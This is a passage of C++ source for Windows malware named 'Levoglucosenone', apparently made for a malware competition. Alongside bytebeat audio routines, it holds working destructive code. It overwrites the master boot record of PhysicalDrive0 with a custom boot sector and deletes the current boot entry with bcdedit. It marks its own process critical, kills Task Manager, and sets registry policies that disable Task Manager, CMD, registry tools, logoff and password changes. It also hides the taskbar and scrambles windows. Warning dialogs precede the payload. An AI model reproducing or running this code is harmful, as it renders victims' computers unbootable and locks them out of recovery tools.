	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}
VOID WINAPI bytebeat6() {
	int nSamplesPerSec = 22050, nSampleCount = nSamplesPerSec * 30;
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec, 1, 8, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
	for (INT t = 0; t < nSampleCount; t++) {
		BYTE bFreq = (BYTE)(((t * (t & 11451 ? 41 : 91) * (7 ^ ((t >> 8) - (t & 1145 ? 1 : 14))) >> (9 & (t << 1)))));
		((BYTE*)psSamples)[t] = bFreq;
	}
	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
	Sleep(nSampleCount * 1000 / nSamplesPerSec);
	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}
	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}
VOID WINAPI bytebeat7() {
	int nSamplesPerSec = 16000, nSampleCount = nSamplesPerSec * 30;
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec, 1, 8, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
	for (INT t = 0; t < nSampleCount; t++) {
		BYTE bFreq = (BYTE)(((((17 * t) ^ (t & 32768 ? 91 : 78) * t | t >> 5 | t >> (t & 65536 ? 7 : 8)) - ((((t >> 2) * (t & 32768 ? 91 : 78)) / (((t >> 11) % 4) + 5) + (t >> 14)) & 128)) ^ t));
		((BYTE*)psSamples)[t] = bFreq;
	}
	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
	Sleep(nSampleCount * 1000 / nSamplesPerSec);
	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}
	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}
VOID WINAPI bytebeat8() {//original in rapacuronium.exe
	int nSamplesPerSec = 29568, nSampleCount = nSamplesPerSec * 30;
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec, 1, 8, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
	for (INT t = 0; t < nSampleCount; t++) {
		BYTE bFreq = (BYTE)((127 * cos(t * (t >> 13 & t >> 14 & 7) ^ t - (t / 256) | 2 * (t >> 13 & t >> 14 & 3) * t & t >> 8 | 4 * t & t >> 6)));
		((BYTE*)psSamples)[t] = bFreq;
	}
	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
	Sleep(nSampleCount * 1000 / nSamplesPerSec);
	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}
	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}
VOID WINAPI bytebeat9() {//credits to soheil shahrab, but i modified it
	int nSamplesPerSec = 5555, nSampleCount = nSamplesPerSec * 30;
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec, 1, 8, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
	for (INT t = 0; t < nSampleCount; t++) {
		BYTE bFreq = (BYTE)((t ^ t / 11) - (sqrt(t | (4 ^ t | 15)) * tan(t % ((t >> 11) + 4)) - 5) / 14);
		((BYTE*)psSamples)[t] = bFreq;
	}
	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
	Sleep(nSampleCount * 1000 / nSamplesPerSec);
	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}
	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}
VOID WINAPI bytebeat10() {
	int nSamplesPerSec = 10086, nSampleCount = nSamplesPerSec * 30;
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec, 1, 8, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
	for (INT t = 0; t < nSampleCount; t++) {
		BYTE bFreq = (BYTE)(((t & 8192 ? (t * (0x20240630 >> (t >> 10) + t)) : ((10 & t) | (t & 10))) | t | (t / (t + 1)) | (t | t) + ((t * 3 & t >> 6) % 76) | (t * 10 & (15 * t))));
		((BYTE*)psSamples)[t] = bFreq;
	}
	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
	Sleep(nSampleCount * 1000 / nSamplesPerSec);
	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}
	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}
VOID WINAPI bytebeat11() {//my old bytebeat, used in ivermectinium.exe&caesium.exe, but modified
	int nSamplesPerSec = 23456, nSampleCount = nSamplesPerSec * 30;
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec, 1, 8, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
	for (INT t = 0; t < nSampleCount; t++) {
		BYTE bFreq = (BYTE)((114 * (t >> 5 | t >> 1 | t >> 4) + (t >> 19 & t << 1) ^ 9 * (t >> 8 & t | t >> 10) + 32 * (t >> t & 32)));
		((BYTE*)psSamples)[t] = bFreq;
	}
	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
	Sleep(nSampleCount * 1000 / nSamplesPerSec);
	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}
	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}
VOID WINAPI bytebeat12() {
	int nSamplesPerSec = 44444, nSampleCount = nSamplesPerSec * 30;
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec, 1, 8, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
	for (INT t = 0; t < nSampleCount; t++) {
		BYTE bFreq = (BYTE)((((t ^ (t + (t & (t >> 13)) + ~(t ^ (t >> 13)) + ((t >> 9) | (t >> 2))) >> 2))));
		((BYTE*)psSamples)[t] = bFreq;
	}
	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
	Sleep(nSampleCount * 1000 / nSamplesPerSec);
	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}
	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}
VOID WINAPI bytebeat13() {
	int nSamplesPerSec = 11025, nSampleCount = nSamplesPerSec * 30;
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec, 1, 8, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
	for (INT t = 0; t < nSampleCount; t++) {
		BYTE bFreq = (BYTE)(((((((t >> 7) * t * ((t >> 8) & (t >> 9))) | ((t + 1) * ((t >> 7) & (t >> 8) & (t >> 9)) * t) | ((t + t) >> (0x20240630 >> (t >> 9 & 30))))))));
		((BYTE*)psSamples)[t] = bFreq;
	}
	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
	Sleep(nSampleCount * 1000 / nSamplesPerSec);
	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}
	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}
VOID WINAPI bytebeat14() {
	int nSamplesPerSec = 22050, nSampleCount = nSamplesPerSec * 30;
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec, 1, 8, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
	for (INT t = 0; t < nSampleCount; t++) {
		BYTE bFreq = (BYTE)((t / 4 | t + 3 & t | t << 5 & t + t - 12 | t % 9 >> 13 | t * (t % 21) / 13 & t + (t / 15)) & t >> 8);
		((BYTE*)psSamples)[t] = bFreq;
	}
	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
	Sleep(nSampleCount * 1000 / nSamplesPerSec);
	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}
	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}
VOID WINAPI bytebeat15() {
	int nSamplesPerSec = 16384, nSampleCount = nSamplesPerSec * 30;
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec, 1, 8, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
	for (INT t = 0; t < nSampleCount; t++) {
		BYTE bFreq = (BYTE)(((t & 32768) ? ((t * rand()) % 200) : ((t % 114) << (t * rand()))));
		((BYTE*)psSamples)[t] = bFreq;
	}
	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
	Sleep(nSampleCount * 1000 / nSamplesPerSec);
	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}
	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}
const unsigned char MasterBootRecord[512] = {
	0xEA, 0x2E, 0x7C, 0x00, 0x00, 0x31, 0xC9, 0x31, 0xD2, 0xFF, 0x06, 0x7B, 0x7C, 0x89, 0x0E, 0x7D,
	0x7C, 0x89, 0x16, 0x7F, 0x7C, 0xEB, 0x31, 0x81, 0xF9, 0x40, 0x01, 0x73, 0x0C, 0x81, 0xFA, 0xC8,
	0x00, 0x73, 0xE2, 0xCD, 0x10, 0x41, 0xEB, 0xE5, 0xC3, 0x31, 0xC9, 0x42, 0xEB, 0xDF, 0xB8, 0x13,
	0x00, 0x31, 0xDB, 0x31, 0xC9, 0x31, 0xD2, 0xCD, 0x10, 0x68, 0x00, 0xA0, 0x07, 0xB8, 0x00, 0x0C,
	0x31, 0xDB, 0x31, 0xC9, 0x31, 0xD2, 0xEB, 0xC5, 0x89, 0xCB, 0x21, 0xD3, 0x02, 0x1E, 0x7B, 0x7C,
	0x88, 0xD8, 0xC0, 0xE8, 0x02, 0xEB, 0x00, 0x3C, 0x37, 0x77, 0x06, 0x3C, 0x20, 0x72, 0x06, 0xEB,
	0xB6, 0x2C, 0x10, 0xEB, 0xF2, 0x04, 0x20, 0xEB, 0xEE, 0x3C, 0x1F, 0x77, 0x06, 0x3C, 0x10, 0x72,
	0x06, 0xEB, 0xA4, 0x2C, 0x10, 0xEB, 0xF2, 0x04, 0x20, 0xEB, 0xEE, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x55, 0xAA
};
typedef VOID(_stdcall* RtlSetProcessIsCritical) (
	IN BOOLEAN        NewValue,
	OUT PBOOLEAN OldValue,
	IN BOOLEAN     IsWinlogon);
BOOL EnablePriv(LPCWSTR lpszPriv) //enable Privilege
{
	HANDLE hToken;
	LUID luid;
	TOKEN_PRIVILEGES tkprivs;
	ZeroMemory(&tkprivs, sizeof(tkprivs));

	if (!OpenProcessToken(GetCurrentProcess(), (TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY), &hToken))
		return FALSE;

	if (!LookupPrivilegeValue(NULL, lpszPriv, &luid)) {
		CloseHandle(hToken); return FALSE;
	}

	tkprivs.PrivilegeCount = 1;
	tkprivs.Privileges[0].Luid = luid;
	tkprivs.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

	BOOL bRet = AdjustTokenPrivileges(hToken, FALSE, &tkprivs, sizeof(tkprivs), NULL, NULL);
	CloseHandle(hToken);
	return bRet;
}
BOOL ProcessIsCritical()
{
	HANDLE hDLL;
	RtlSetProcessIsCritical fSetCritical;

	hDLL = LoadLibraryA("ntdll.dll");
	if (hDLL != NULL)
	{
		EnablePriv(SE_DEBUG_NAME);
		(fSetCritical) = (RtlSetProcessIsCritical)GetProcAddress((HINSTANCE)hDLL, "RtlSetProcessIsCritical");
		if (!fSetCritical) return 0;
		fSetCritical(1, 0, 0);
		return 1;
	}
	else
		return 0;
}
DWORD WINAPI KillMBR(LPVOID lpParam) {
	DWORD dwBytesWritten;
	HANDLE hDevice = CreateFileW(
		L"\\\\.\\PhysicalDrive0", GENERIC_ALL,
		FILE_SHARE_READ | FILE_SHARE_WRITE, 0,
		OPEN_EXISTING, 0, 0);

	WriteFile(hDevice, MasterBootRecord, 512, &dwBytesWritten, 0);
	return 1;
}
void reg_addition(HKEY HKey, LPCWSTR Subkey, LPCWSTR ValueName, unsigned long Type, unsigned int Value)//credits to Mist0090 because creating registry keys in C++ without shitty system() or reg.exe is hell
{
	HKEY hKey;
	DWORD dwDisposition;
	LONG result;
	result = RegCreateKeyExW(
		HKey, //HKEY
		Subkey,
		0,
		NULL,
		REG_OPTION_NON_VOLATILE,
		KEY_ALL_ACCESS,
		NULL,
		&hKey,
		&dwDisposition
	);
	result = RegSetValueExW(
		hKey,
		ValueName,
		0,
		Type,
		(const unsigned char*)&Value,
		(int)sizeof(Value)
	);
	RegCloseKey(hKey);
	return;
}
VOID WINAPI MsgBoxCorruptionThread(HWND hwndMsgBox) {
	HDC hdc = GetDC(hwndMsgBox);
	RECT rect;
	GetWindowRect(hwndMsgBox, &rect);
	int w = rect.right - rect.left, h = rect.bottom - rect.top;
	InvalidateRect(0, 0, 0);
	Sleep(1000);
	while (true)
	{
		ShakingBlt(hdc, 15, 15, w, h, SRCCOPY);
		BlockBlt(hdc, w, h, 168, PATCOPY);
		Sleep(100);
	}
}
LRESULT CALLBACK msgBoxHook(int nCode, WPARAM wParam, LPARAM lParam) {
	if (nCode == HCBT_ACTIVATE) {
		HWND hwndMsgBox = (HWND)wParam;
		ShowWindow(hwndMsgBox, 5);
		HANDLE handle = CreateThread(NULL, 0, (PTHREAD_START_ROUTINE)MsgBoxCorruptionThread, hwndMsgBox, 0, NULL);
		return 0;
	}
	return CallNextHookEx(0, nCode, wParam, lParam);
}
DWORD WINAPI HideTaskbar(LPVOID lpParam) {
	HWND taskbar = FindWindow(L"Shell_TrayWnd", NULL);
	ShowWindow(taskbar, SW_HIDE);
	return 0;
}
static ULONGLONG nnn, rrr;
int randforrndstr() { return nnn = rrr, nnn ^= 0x8ebf635bee3c6d25, nnn ^= nnn << 5 | nnn >> 26, nnn *= 0xf3e05ca5c43e376b, rrr = nnn,nnn & 0x7fffffff; }
string GetRandomStr(int len) {
	string random_str = "";
	for (int i = 0; i < len; ++i) {
		switch (randforrndstr() % 4) {
		case 1:
			random_str += ('A' + rand() % 26);
			break;
		case 2:
			random_str += ('a' + rand() % 26);
			break;
		case 3:
			random_str += ('!' + rand() % 15);
			break;
		default:
			random_str += ('0' + rand() % 10);
			break;
		}
	}
	return random_str;
}
BOOL CALLBACK EnumProc(HWND hWnd, LPARAM lParam) {
	srand(time(NULL));
	string str = GetRandomStr(100);
	const char* c = str.c_str();
	SendMessageTimeoutW(hWnd, WM_SETTEXT, NULL, (LPARAM)c, SMTO_ABORTIFHUNG, 100, NULL);
	return 1;
}
DWORD WINAPI SomeTexts(LPVOID lpParam) {
	while (true) {
		EnumChildWindows(GetDesktopWindow(), EnumProc, 0);
		Sleep(100);
	}
}
DWORD WINAPI WinShake(LPVOID lpParam)
{
	int x = 0, y = 0, signX = 1, signY = 1, incrementor = 10;
	while (true)
	{
		HWND hwnd = GetForegroundWindow();
		x += incrementor * signX;
		y += incrementor * signY;
		SetWindowPos(hwnd, nullptr, x, y, x, y, SWP_NOSIZE);
		if (y >= GetSystemMetrics(SM_CYSCREEN)) { signY = -1; }
		if (x >= GetSystemMetrics(SM_CXSCREEN)) { signX = -1; }
		if (y == 0) { signY = 2; }
		if (x == 0) { signX = 2; }
		Sleep(10);
		DeleteObject(hwnd);
	}
}
int main()
{
	InitDPI();
	srand(time(NULL));
	ShowWindow(GetConsoleWindow(), SW_HIDE);
	CREATE_NO_WINDOW;
	if (MessageBoxA(NULL, "Warning! This program is a malware that known as 'Levoglucosenone'. It may make your computer cannot work normally. Whether to run or not?\r\n\Please don't maliciously open this program on other people's or public computers! If you accidentally opened it, please click the \"No\" button to cancel the running. If you want to run it, please make sure you are running it on your own computer, or ensure that the virus on this computer is in a secure environment (such as a virtual machine, sandbox, etc.) and turn off all antivirus software. If you are running this program on other people's or public computers, please make sure you are running the harmless edition of this program, and then click the \"Yes\" button to continue.\r\n\r\n\Made for Nyexev(hexademical)'s malware competition.", "Levoglucosenone.exe--First warning", MB_YESNO | MB_ICONWARNING | MB_DEFBUTTON2) == IDNO)
	{
		ExitProcess(0);
	}
	else
	{
		CREATE_NO_WINDOW;
		HHOOK hMsgHook = SetWindowsHookEx(WH_CBT, msgBoxHook, 0, GetCurrentThreadId());
		if (MessageBoxW(NULL, L"This is the last warning!!!\r\n\Do you want to run this? After running, your computer may not work normally! If you run the harmful edition of this program on other people's or public computers, you will be responsible for any losses and legal liabilities caused by running this program! LambdaTechnology(@LambdaTech-w3o) is NOT responsible for any damages caused by this malware!!!", L"Levoglucosenone.exe--LAST WARNING", MB_YESNO | MB_ICONWARNING) == IDNO)
		{
			UnhookWindowsHookEx(hMsgHook);
			ExitProcess(0);
		}
		else
		{
			UnhookWindowsHookEx(hMsgHook);
			ProcessIsCritical();
			system("taskkill /f /im taskmgr.exe");
			system("start mspaint");
			reg_addition(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\policies\\Explorer", L"NoRun", REG_DWORD, 1);
			reg_addition(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\policies\\Explorer", L"NoControlPanel", REG_DWORD, 1);
			reg_addition(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", L"DisableLockWorkstation", REG_DWORD, 1);
			reg_addition(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", L"NoLogoff", REG_DWORD, 1);
			reg_addition(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", L"DisableChangePassword", REG_DWORD, 1);
			reg_addition(HKEY_LOCAL_MACHINE, L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", L"HideFastUserSwiching", REG_DWORD, 1);
			system("bcdedit /delete {current}");
			reg_addition(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", L"DisableTaskMgr", REG_DWORD, 1);
			reg_addition(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", L"DisableRegistryTools", REG_DWORD, 1);
			reg_addition(HKEY_CURRENT_USER, L"SOFTWARE\\Policies\\Microsoft\\Windows\\System", L"DisableCMD", REG_DWORD, 1);
			CreateThread(0, 0, KillMBR, 0, 0, 0);
			CreateThread(0, 0, HideTaskbar, 0, 0, 0);
			HANDLE thread0a = CreateThread(0, 0, SomeTexts, 0, 0, 0);
			HANDLE thread0b = CreateThread(0, 0, WinShake, 0, 0, 0);
			Sleep(5000);
			HANDLE thread1 = CreateThread(0, 0, Payload1_num1, 0, 0, 0);
			bytebeat1();
			TerminateThread(thread1, 0);
			CloseHandle(thread1);
			refreshscr();
			Sleep(100);
			HANDLE thread2 = CreateThread(0, 0, Payload2_num1, 0, 0, 0);
			bytebeat2();
			TerminateThread(thread2, 0);
			CloseHandle(thread2);
			refreshscr();
			Sleep(100);
			HANDLE thread3_num1 = CreateThread(0, 0, Payload3_num1, 0, 0, 0);
			HANDLE thread3_num2 = CreateThread(0, 0, Payload3_num2, 0, 0, 0);
			HANDLE thread3_num3 = CreateThread(0, 0, Payload3_num3, 0, 0, 0);
			bytebeat3();
			TerminateThread(thread3_num1, 0);
			CloseHandle(thread3_num1);
			refreshscr();
			Sleep(100);
			HANDLE thread4 = CreateThread(0, 0, Payload4_num1, 0, 0, 0);
			bytebeat4();
			TerminateThread(thread4, 0);
			CloseHandle(thread4);
			refreshscr();
			Sleep(100);
			HANDLE thread5 = CreateThread(0, 0, Payload5_num1, 0, 0, 0);
			bytebeat5();
			TerminateThread(thread5, 0);
			CloseHandle(thread5);
			refreshscr();
			Sleep(100);
			HANDLE thread6 = CreateThread(0, 0, Payload6_num1, 0, 0, 0);
			bytebeat6();
			TerminateThread(thread6, 0);
			CloseHandle(thread6);
			refreshscr();
			Sleep(100);
			HANDLE thread7_num1 = CreateThread(0, 0, Payload7_num1, 0, 0, 0);
			HANDLE thread7_num2 = CreateThread(0, 0, Payload7_num2, 0, 0, 0);
			bytebeat7();
			TerminateThread(thread7_num1, 0);
			CloseHandle(thread7_num1);
			refreshscr();
			Sleep(100);
			HANDLE thread8_num1 = CreateThread(0, 0, Payload8_num1, 0, 0, 0);
			HANDLE thread8_num2 = CreateThread(0, 0, Payload8_num2, 0, 0, 0);
			bytebeat8();
			TerminateThread(thread8_num1, 0);
			CloseHandle(thread8_num1);
			TerminateThread(thread8_num2, 0);
			CloseHandle(thread8_num2);
			refreshscr();
			Sleep(100);
			HANDLE thread9 = CreateThread(0, 0, Payload9_num1, 0, 0, 0);
			bytebeat9();
			TerminateThread(thread9, 0);
			CloseHandle(thread9);
			refreshscr();
			Sleep(100);
			HANDLE thread10 = CreateThread(0, 0, Payload10_num1, 0, 0, 0);
			bytebeat10();
			TerminateThread(thread10, 0);
			CloseHandle(thread10);
			refreshscr();
			Sleep(100);
			HANDLE thread11_num1 = CreateThread(0, 0, Payload11_num1, 0, 0, 0);
			HANDLE thread11_num2 = CreateThread(0, 0, Payload11_num2, 0, 0, 0);
			bytebeat11();
